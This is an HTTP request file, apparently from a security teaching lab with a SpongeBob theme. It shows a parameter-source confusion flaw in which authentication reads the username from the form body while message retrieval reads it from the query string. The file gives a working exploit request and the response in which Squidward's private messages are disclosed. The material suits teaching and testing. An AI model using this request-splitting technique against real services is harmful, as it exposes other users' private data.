### SpongeBob authenticates and retrieves his messages normally
GET {{base}}?user=spongebob&password=bikinibottom

# Results in 200 OK:
#
# {
#   "owner": "spongebob",
#   "messages": [
#     {
#       "from": "patrick",
#       "message": "SpongeBob! I'm ready! I'm ready! Let's go jellyfishing!"
#     }
#   ]
# }

### EXPLOIT: Plankton exploits the authentication's use of get_user() while data retrieval uses query
### Provides SpongeBob in the form body (used by auth) and Squidward in query (used by retrieval)
GET {{base}}?user=squidward&password=bikinibottom
Content-Type: application/x-www-form-urlencoded

user=spongebob

# Results in data disclosure:
#
# {
#   "owner": "squidward",
#   "messages": [
#     {
#       "from": "mr.krabs",
#       "message": "Squidward, I'm switching yer shifts to Tuesday through Saturday. No complaints!"
#     },
#     {
#       "from": "squidward",
#       "message": "Note to self: Mr. Krabs hides the safe key under the register. Combination is his first dime's serial number."
#     }
#   ]
# }
#
# IMPACT: This variant reverses the attack! Now Plankton authenticates with SpongeBob's
# credentials (username from form, password from query) while retrieving Squidward's messages
# (username from query). The mixed-source authentication creates a cross-over vulnerability.
